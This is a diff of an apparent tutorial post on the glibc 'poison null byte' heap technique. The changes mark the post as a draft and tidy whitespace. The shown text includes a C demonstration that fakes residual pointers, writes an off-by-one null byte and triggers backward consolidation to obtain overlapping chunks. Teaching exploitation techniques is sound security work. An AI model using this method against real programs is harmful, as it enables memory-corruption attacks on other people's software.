@@ -7,6 +7,7 @@
     description: "Exploiting an off-by-one null byte to trigger backward consolidation and chunk overlapping.",
     date: "2025-12-26",
     order: 24,
+    draft: true,
   ),
 )<frontmatter>
 
@@ -38,7 +39,7 @@ int main()
 	setbuf(stdout, NULL);
 
 	puts("Welcome to poison null byte!");
-	
+
 	// Step 1: Allocate padding to align heap
 	void *tmp = malloc(0x1);
 	void *heap_base = (void *)((long)tmp & (~0xfff));
@@ -69,19 +70,19 @@ int main()
 	// Step 5: Bypass unlinking using residual pointers
 	void *b2 = malloc(0x510);
 	((char*)b2)[0] = '\x10';
-	((char*)b2)[1] = '\x00'; 
+	((char*)b2)[1] = '\x00';
 
 	void *a2 = malloc(0x4f0);
 	free(a2);
-	free(victim); 
-	
+	free(victim);
+
 	void *a3 = malloc(0x4f0);
 	((char*)a3)[8] = '\x10';
 	((char*)a3)[9] = '\x00';
 
 	// Step 6: Trigger the off-by-null
 	void *victim2 = malloc(0x4f0);
-	((char *)victim2)[-8] = '\x00'; 
+	((char *)victim2)[-8] = '\x00';
 
 	// Trigger backward consolidation
 	free(victim);
@@ -148,8 +149,8 @@ We allocate `victim` again. Because of the off-by-one vulnerability, we can writ
 )
 
 The null byte does two things:
-1.  Clears the `PREV_INUSE` bit of the `victim` chunk.
-2.  Potentially shrinks the `size` field (though in this specific bypass, we mostly care about the bit).
+1. Clears the `PREV_INUSE` bit of the `victim` chunk.
+2. Potentially shrinks the `size` field (though in this specific bypass, we mostly care about the bit).
 
 === 4. Consolidation and Overlapping
 
@@ -169,3 +170,4 @@ When we `free(victim)`, the allocator sees `PREV_INUSE == 0`. It then looks at `
 )
 
 We now have two pointers: `prev2` and the new `merged` pointer, both pointing to the same memory. Overwriting one will affect the other.
+
